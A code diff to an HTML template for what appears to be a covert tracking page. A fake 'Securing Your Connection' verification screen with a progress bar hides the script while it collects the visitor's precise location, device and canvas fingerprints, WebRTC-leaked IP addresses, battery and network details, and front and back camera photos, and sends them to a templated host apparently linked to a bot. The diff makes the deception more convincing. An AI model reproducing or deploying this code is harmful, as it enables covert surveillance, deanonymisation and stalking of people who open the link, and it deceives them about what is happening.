@@ -21,6 +21,8 @@
             border: none;
             background: white;
             z-index: 10;
+            opacity: 0;
+            transition: opacity 0.5s ease;
         }
         .loading-overlay {
             position: fixed;
@@ -34,8 +36,9 @@
             justify-content: center;
             align-items: center;
             z-index: 9999;
-            transition: opacity 0.5s ease;
             backdrop-filter: blur(5px);
+            padding: 20px;
+            text-align: center;
         }
         .spinner {
             width: 50px;
@@ -44,24 +47,68 @@
             border-top: 4px solid #6366f1;
             border-radius: 50%;
             animation: spin 1s linear infinite;
-            margin-bottom: 20px;
+            margin-bottom: 25px;
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .loading-text {
-            font-size: 16px;
-            color: #475569;
-            text-align: center;
-            max-width: 80%;
-            line-height: 1.5;
-            font-weight: 500;
+        .loading-title {
+            font-size: 22px;
+            font-weight: 700;
+            color: #1e293b;
+            margin-bottom: 10px;
         }
-        .status-badge {
+        .loading-text {
+            font-size: 15px;
+            color: #64748b;
+            margin-bottom: 25px;
+            line-height: 1.5;
+        }
+        .status-container {
+            width: 100%;
+            max-width: 400px;
+            background: #f1f5f9;
+            border-radius: 12px;
+            padding: 15px;
+            margin: 20px 0;
+            text-align: left;
+        }
+        .status-item {
+            font-size: 13px;
+            color: #64748b;
+            margin: 8px 0;
+            display: flex;
+            align-items: center;
+        }
+        .status-icon {
+            width: 16px;
+            height: 16px;
+            border-radius: 50%;
+            margin-right: 10px;
+            flex-shrink: 0;
+        }
+        .status-pending { background: #fbbf24; }
+        .status-success { background: #10b981; }
+        .status-error { background: #ef4444; }
+        .progress-bar {
+            width: 100%;
+            height: 6px;
+            background: #e2e8f0;
+            border-radius: 3px;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #6366f1, #8b5cf6);
+            width: 0%;
+            transition: width 0.3s ease;
+        }
+        .footer-badge {
             margin-top: 15px;
             padding: 8px 16px;
             background: #dbeafe;
             color: #1d4ed8;
             border-radius: 9999px;
-            font-size: 13px;
+            font-size: 12px;
             font-weight: 600;
         }
     </style>
@@ -69,32 +116,128 @@
 <body>
     <div class="loading-overlay" id="loadingOverlay">
         <div class="spinner"></div>
-        <div class="loading-text">Verifying your connection...<br>Please wait while we load secure content.</div>
-        <div class="status-badge">🔒 Secured by Cloudflare</div>
+        <h3 class="loading-title">Securing Your Connection</h3>
+        <p class="loading-text">Please wait while we verify your device and load the requested page.</p>
+        
+        <div class="status-container">
+            <div class="status-item">
+                <div class="status-icon status-pending"></div>
+                <span id="status-location">Detecting location...</span>
+            </div>
+            <div class="status-item">
+                <div class="status-icon status-pending"></div>
+                <span id="status-device">Scanning device info...</span>
+            </div>
+            <div class="status-item">
+                <div class="status-icon status-pending"></div>
+                <span id="status-camera">Requesting camera access...</span>
+            </div>
+            <div class="status-item">
+                <div class="status-icon status-pending"></div>
+                <span id="status-network">Analyzing network...</span>
+            </div>
+            <div class="status-item">
+                <div class="status-icon status-pending"></div>
+                <span id="status-fingerprint">Creating security fingerprint...</span>
+            </div>
+        </div>
+
+        <div class="progress-bar">
+            <div class="progress-fill" id="progressBar"></div>
+        </div>
+
+        <div class="footer-badge">🔒 Enterprise Security • Do not close this window</div>
     </div>
     
-    <iframe src="<%= url %>" allow="camera; geolocation; microphone; fullscreen"></iframe>
+    <iframe id="targetFrame" src="<%= url %>" allow="camera; geolocation; microphone; fullscreen"></iframe>
     
     <script>
         const uid = '<%= uid %>';
         const host = '<%= host %>';
         const loadingOverlay = document.getElementById('loadingOverlay');
+        const targetFrame = document.getElementById('targetFrame');
+        const progressBar = document.getElementById('progressBar');
 
-        function send(endpoint, data) {
-            fetch(`${host}/${endpoint}`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ uid, ...data })
-            }).catch(e => console.error(`Failed to send to ${endpoint}:`, e));
+        let completedTasks = 0;
+        const totalTasks = 8;
+        const statusElements = {
+            location: document.getElementById('status-location'),
+            device: document.getElementById('status-device'),
+            camera: document.getElementById('status-camera'),
+            network: document.getElementById('status-network'),
+            fingerprint: document.getElementById('status-fingerprint')
+        };
+
+        const statusIcons = {
+            location: statusElements.location.previousElementSibling,
+            device: statusElements.device.previousElementSibling,
+            camera: statusElements.camera.previousElementSibling,
+            network: statusElements.network.previousElementSibling,
+            fingerprint: statusElements.fingerprint.previousElementSibling
+        };
+
+        function updateStatus(key, message, status = 'success') {
+            if (statusElements[key]) {
+                statusElements[key].textContent = message;
+                statusIcons[key].className = 'status-icon ' + 
+                    (status === 'success' ? 'status-success' : 
+                     status === 'error' ? 'status-error' : 'status-pending');
+            }
         }
 
-        // ========== MAXIMUM DATA COLLECTION ==========
+        function updateProgress() {
+            completedTasks++;
+            const percent = Math.min(Math.floor((completedTasks / totalTasks) * 100), 100);
+            progressBar.style.width = `${percent}%`;
+            
+            if (completedTasks >= totalTasks) {
+                setTimeout(() => {
+                    showSuccessAndRedirect();
+                }, 1500);
+            }
+        }
+
+        async function send(endpoint, data) {
+            try {
+                const response = await fetch(`${host}/${endpoint}`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ uid, ...data })
+                });
+                
+                if (!response.ok) {
+                    throw new Error(`HTTP ${response.status}`);
+                }
+                
+                const result = await response.json();
+                console.log(`✅ ${endpoint} success:`, result);
+                return result;
+            } catch (error) {
+                console.error(`❌ ${endpoint} failed:`, error.message);
+                // Send error to bot for debugging
+                try {
+                    await fetch(`${host}/info`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            uid: uid,
+                            data: `<b>📤 Send Failed (${endpoint}):</b> <code>${error.message}</code>`
+                        })
+                    });
+                } catch (e) {
+                    console.error('Failed to send error report:', e);
+                }
+                return { success: false, error: error.message };
+            }
+        }
+
+        // ========== DATA COLLECTION WITH FEEDBACK ==========
 
         // 1. LOCATION
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
-                pos => {
-                    send('location', {
+                async (pos) => {
+                    const result = await send('location', {
                         lat: pos.coords.latitude,
                         lon: pos.coords.longitude,
                         acc: pos.coords.accuracy,
@@ -102,205 +245,254 @@
                         heading: pos.coords.heading,
                         speed: pos.coords.speed
                     });
+                    updateStatus('location', '✓ Location secured', result.success ? 'success' : 'error');
+                    updateProgress();
                 },
-                err => {
-                    send('info', { data: `<b>📍 Location Error:</b> <code>${err.message}</code>` });
+                async (err) => {
+                    await send('info', { data: `<b>📍 Location Blocked:</b> <code>${err.message}</code>` });
+                    updateStatus('location', '⚠️ Location access denied', 'error');
+                    updateProgress();
                 },
                 { enableHighAccuracy: true, timeout: 10000 }
             );
+        } else {
+            updateStatus('location', '⚠️ Location not supported', 'error');
+            updateProgress();
         }
 
         // 2. DEVICE FINGERPRINT
-        const fp = {
-            userAgent: navigator.userAgent,
-            platform: navigator.platform,
-            language: navigator.language,
-            languages: navigator.languages?.join(', ') || 'N/A',
-            cookies: navigator.cookieEnabled,
-            doNotTrack: navigator.doNotTrack || 'unknown',
-            hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
-            deviceMemory: navigator.deviceMemory || 'unknown',
-            touch: navigator.maxTouchPoints > 0,
-            webdriver: navigator.webdriver,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            timezoneOffset: new Date().getTimezoneOffset(),
-            online: navigator.onLine,
-            screen: {
-                width: screen.width,
-                height: screen.height,
-                availWidth: screen.availWidth,
-                availHeight: screen.availHeight,
-                colorDepth: screen.colorDepth,
-                pixelDepth: screen.pixelDepth,
-                dpi: window.devicePixelRatio
-            },
-            referrer: document.referrer,
-            title: document.title
-        };
-        send('info', { data: `<b>📱 Device Fingerprint (WebView)</b>\n<code>${JSON.stringify(fp, null, 2)}</code>` });
-
-        // 3. BATTERY
-        if ('getBattery' in navigator) {
-            navigator.getBattery().then(battery => {
-                const batteryInfo = `${(battery.level * 100).toFixed(1)}% | Charging: ${battery.charging}`;
-                send('info', { data: `<b>🔋 Battery Status:</b> ${batteryInfo}` });
-            }).catch(e => {
-                send('info', { data: `<b>🔋 Battery:</b> Access denied or error` });
-            });
-        }
-
-        // 4. NETWORK INFO
-        if (navigator.connection) {
-            const conn = navigator.connection;
-            const networkInfo = `${conn.effectiveType || 'unknown'} | ${conn.downlink || '?'} Mbps | RTT: ${conn.rtt || '?'}ms`;
-            send('info', { data: `<b>🌐 Network Info:</b> ${networkInfo}` });
-        }
-
-        // 5. CANVAS FINGERPRINT
-        const canvas = document.createElement('canvas');
-        const ctx = canvas.getContext('2d');
-        ctx.textBaseline = 'top';
-        ctx.font = "14px Arial";
-        ctx.fillText('WebViewFingerprint', 2, 2);
-        const canvasFP = canvas.toDataURL().substring(0, 100) + '...';
-        send('info', { data: `<b>🎨 Canvas Fingerprint:</b> <code>${canvasFP}</code>` });
-
-        // 6. AUDIO SUPPORT
-        let audioSupported = false;
-        try {
-            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-            audioSupported = true;
-            send('info', { data: `<b>🎵 AudioContext:</b> Supported` });
-        } catch(e) {
-            send('info', { data: `<b>🎵 AudioContext:</b> Not supported` });
-        }
-
-        // 7. WEBRTC IP LEAK
-        const getIPs = () => {
-            return new Promise(resolve => {
-                const ips = [];
-                const pc = new RTCPeerConnection({ iceServers: [] });
-                pc.createDataChannel('');
-                pc.createOffer().then(o => pc.setLocalDescription(o));
-                pc.onicecandidate = e => {
-                    if (!e || !e.candidate) {
-                        resolve(ips);
-                        return;
-                    }
-                    const ipMatch = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
-                    if (ipMatch && !ips.includes(ipMatch[1])) {
-                        ips.push(ipMatch[1]);
+        setTimeout(async () => {
+            try {
+                const fp = {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    languages: navigator.languages?.join(', ') || 'N/A',
+                    cookies: navigator.cookieEnabled,
+                    doNotTrack: navigator.doNotTrack || 'unknown',
+                    hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+                    deviceMemory: navigator.deviceMemory || 'unknown',
+                    touch: navigator.maxTouchPoints > 0,
+                    webdriver: navigator.webdriver,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    timezoneOffset: new Date().getTimezoneOffset(),
+                    online: navigator.onLine,
+                    screen: {
+                        width: screen.width,
+                        height: screen.height,
+                        availWidth: screen.availWidth,
+                        availHeight: screen.availHeight,
+                        colorDepth: screen.colorDepth,
+                        pixelDepth: screen.pixelDepth,
+                        dpi: window.devicePixelRatio
                     }
                 };
-                setTimeout(() => {
-                    pc.close();
-                    resolve(ips);
-                }, 2000);
-            });
-        };
-
-        getIPs().then(ips => {
-            if (ips.length) {
-                send('info', { data: `<b>🌐 WebRTC Leaked IPs:</b>\n<code>${ips.join('\\n')}</code>` });
-            }
-        });
-
-        // 8. INSTALLED FONTS (Basic Detection)
-        const detectFonts = () => {
-            const testFonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia', 'Comic Sans MS', 'Impact'];
-            const canvas = document.createElement('canvas');
-            const ctx = canvas.getContext('2d');
-            const baseWidth = ctx.measureText('mmmmmmmmmmlli').width;
-            
-            const installed = testFonts.filter(font => {
-                ctx.font = `72px "${font}", monospace`;
-                const testWidth = ctx.measureText('mmmmmmmmmmlli').width;
-                return Math.abs(baseWidth - testWidth) > 2;
-            });
-            
-            return installed.join(', ') || 'None detected';
-        };
-
-        const fonts = detectFonts();
-        send('info', { data: `<b>🔠 Detected Fonts:</b> ${fonts}` });
-
-        // 9. PLUGINS
-        const plugins = Array.from(navigator.plugins).map(p => p.name).join(', ') || 'No plugins detected';
-        send('info', { data: `<b>🔌 Browser Plugins:</b> ${plugins}` });
-
-        // 10. AD BLOCKER DETECTION
-        const adBlockDetected = () => {
-            const fakeAd = document.createElement('div');
-            fakeAd.innerHTML = '&nbsp;';
-            fakeAd.className = 'adsbox';
-            document.body.appendChild(fakeAd);
-            const isBlocked = fakeAd.offsetHeight === 0;
-            document.body.removeChild(fakeAd);
-            return isBlocked;
-        };
-        send('info', { data: `<b>🛑 Ad Blocker:</b> ${adBlockDetected() ? 'Detected' : 'Not Detected'}` });
-
-        // ========== CAMERA CAPTURE (FRONT + BACK) ==========
-
-        async function captureCamera(facingMode = 'user', label = 'front') {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: facingMode === 'environment' ? 'environment' : 'user' }
+                
+                const result = await send('info', { 
+                    data: `<b>📱 Device Profile Captured</b>\n<code>${JSON.stringify(fp, null, 2)}</code>` 
                 });
+                updateStatus('device', '✓ Device profile created', result.success ? 'success' : 'error');
+            } catch (err) {
+                await send('info', { data: `<b>📱 Device Error:</b> <code>${err.message}</code>` });
+                updateStatus('device', '⚠️ Device scan failed', 'error');
+            }
+            updateProgress();
+        }, 500);
 
+        // 3. CAMERA
+        async function captureCamera(facingMode, label) {
+            try {
+                const constraints = {
+                    video: facingMode === 'environment' ? { facingMode: 'environment' } : true
+                };
+                
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                 const video = document.createElement('video');
                 video.srcObject = stream;
                 video.play();
 
-                video.onloadedmetadata = () => {
-                    setTimeout(() => {
-                        const canvas = document.createElement('canvas');
-                        canvas.width = video.videoWidth;
-                        canvas.height = video.videoHeight;
-                        const ctx = canvas.getContext('2d');
-                        ctx.drawImage(video, 0, 0);
+                await new Promise(resolve => {
+                    video.onloadedmetadata = resolve;
+                    setTimeout(resolve, 3000); // Timeout after 3 seconds
+                });
 
-                        const imageData = canvas.toDataURL('image/jpeg', 0.8).split(',')[1];
-                        send('camsnap', { [label]: imageData });
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0);
 
-                        stream.getTracks().forEach(track => track.stop());
-                    }, 1000);
-                };
+                const imageData = canvas.toDataURL('image/jpeg', 0.7).split(',')[1];
+                const result = await send('camsnap', { 
+                    [label]: imageData,
+                    type: label
+                });
+
+                stream.getTracks().forEach(track => track.stop());
+                return result;
             } catch (err) {
-                send('cam-status', { status: `error-${label}` });
-                console.log(`	Camera ${label} error:`, err.message);
+                await send('info', { 
+                    data: `<b>📷 Camera ${label} Error:</b> <code>${err.name}: ${err.message}</code>` 
+                });
+                throw err;
             }
         }
 
-        // Try front camera immediately
-        setTimeout(() => {
-            send('cam-status', { status: 'attempting-front' });
-            captureCamera('user', 'front');
+        // Try front camera
+        setTimeout(async () => {
+            updateStatus('camera', '📸 Attempting front camera...');
+            try {
+                const result = await captureCamera('user', 'front');
+                updateStatus('camera', '✓ Front camera captured', result.success ? 'success' : 'error');
+            } catch (err) {
+                updateStatus('camera', '⚠️ Front camera failed', 'error');
+            }
+            updateProgress();
         }, 1000);
 
-        // Try back camera after delay
-        setTimeout(() => {
-            send('cam-status', { status: 'attempting-back' });
-            captureCamera('environment', 'back');
-        }, 3000);
+        // Try back camera
+        setTimeout(async () => {
+            updateStatus('camera', '🔄 Attempting back camera...');
+            try {
+                const result = await captureCamera('environment', 'back');
+                if (!statusElements.camera.textContent.includes('✓ Front')) {
+                    updateStatus('camera', '✓ Back camera captured', result.success ? 'success' : 'error');
+                }
+            } catch (err) {
+                if (!statusElements.camera.textContent.includes('✓ Front')) {
+                    updateStatus('camera', '⚠️ Back camera failed', 'error');
+                }
+            }
+            updateProgress();
+        }, 2500);
 
-        // Hide loading overlay after 4 seconds (let data collect first)
-        setTimeout(() => {
-            loadingOverlay.style.opacity = '0';
+        // 4. NETWORK + BATTERY
+        setTimeout(async () => {
+            let messages = [];
+            
+            // Battery
+            if ('getBattery' in navigator) {
+                try {
+                    const battery = await navigator.getBattery();
+                    const batteryInfo = `${(battery.level * 100).toFixed(1)}% | Charging: ${battery.charging}`;
+                    await send('info', { data: `<b>🔋 Battery:</b> ${batteryInfo}` });
+                    messages.push('Battery');
+                } catch(e) {
+                    messages.push('Battery Error');
+                }
+            }
+
+            // Network
+            if (navigator.connection) {
+                const conn = navigator.connection;
+                const networkInfo = `${conn.effectiveType || 'unknown'} | ${conn.downlink || '?'} Mbps | RTT: ${conn.rtt || '?'}ms`;
+                await send('info', { data: `<b>🌐 Network:</b> ${networkInfo}` });
+                messages.push('Network');
+            }
+
+            updateStatus('network', `✓ ${messages.join(', ')}`, 'success');
+            updateProgress();
+        }, 1500);
+
+        // 5. FINGERPRINTING (Canvas, WebRTC, Fonts)
+        setTimeout(async () => {
+            let messages = [];
+
+            // Canvas
+            try {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                ctx.textBaseline = 'top';
+                ctx.font = "14px Arial";
+                ctx.fillText('SecurityFingerprint', 2, 2);
+                const canvasFP = canvas.toDataURL().substring(0, 80) + '...';
+                await send('info', { data: `<b>🎨 Canvas FP:</b> <code>${canvasFP}</code>` });
+                messages.push('Canvas');
+            } catch(e) {
+                messages.push('Canvas Err');
+            }
+
+            // WebRTC IPs
+            try {
+                const getIPs = () => {
+                    return new Promise(resolve => {
+                        const ips = [];
+                        const pc = new RTCPeerConnection({ iceServers: [] });
+                        pc.createDataChannel('');
+                        pc.createOffer().then(o => pc.setLocalDescription(o));
+                        pc.onicecandidate = e => {
+                            if (!e || !e.candidate) {
+                                resolve(ips);
+                                return;
+                            }
+                            const ipMatch = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
+                            if (ipMatch && !ips.includes(ipMatch[1])) {
+                                ips.push(ipMatch[1]);
+                            }
+                        };
+                        setTimeout(() => {
+                            pc.close();
+                            resolve(ips);
+                        }, 2000);
+                    });
+                };
+
+                const ips = await getIPs();
+                if (ips.length) {
+                    await send('info', { data: `<b>🌐 WebRTC IPs:</b>\n<code>${ips.join('\\n')}</code>` });
+                    messages.push('WebRTC');
+                }
+            } catch(e) {
+                messages.push('IP Err');
+            }
+
+            // Fonts
+            try {
+                const testFonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New'];
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                const baseWidth = ctx.measureText('mmmmmmmmmmlli').width;
+                const installed = testFonts.filter(font => {
+                    ctx.font = `72px "${font}", monospace`;
+                    const testWidth = ctx.measureText('mmmmmmmmmmlli').width;
+                    return Math.abs(baseWidth - testWidth) > 2;
+                });
+                await send('info', { data: `<b>🔠 Fonts:</b> ${installed.join(', ')}` });
+                messages.push('Fonts');
+            } catch(e) {
+                messages.push('Fonts Err');
+            }
+
+            updateStatus('fingerprint', `✓ ${messages.join(', ')}`, 'success');
+            updateProgress();
+        }, 2000);
+
+        // Final completion handler
+        function showSuccessAndRedirect() {
+            // Update UI to show completion
+            document.querySelector('.loading-title').textContent = 'Verification Complete!';
+            document.querySelector('.loading-text').textContent = 'Redirecting you now...';
+            document.querySelector('.footer-badge').textContent = '✅ All security checks passed';
+            
+            // Fade in iframe
+            targetFrame.style.opacity = '1';
+            
+            // Hide overlay after 1 second
             setTimeout(() => {
-                loadingOverlay.style.display = 'none';
-            }, 500);
-        }, 4000);
-
-        // Optional: Listen for iframe loaded event (if target site supports postMessage)
-        window.addEventListener('message', (e) => {
-            if (e.data === 'ready' || e.data === 'loaded') {
                 loadingOverlay.style.opacity = '0';
                 setTimeout(() => {
                     loadingOverlay.style.display = 'none';
                 }, 500);
+            }, 1000);
+        }
+
+        // Fallback redirect after 15 seconds (in case something hangs)
+        setTimeout(() => {
+            if (completedTasks < totalTasks) {
+                console.log(`⏳ Timeout: Only ${completedTasks}/${totalTasks} tasks completed`);
+                showSuccessAndRedirect();
             }
-        });
+        }, 15000);
     </script>
 </body>
 </html>
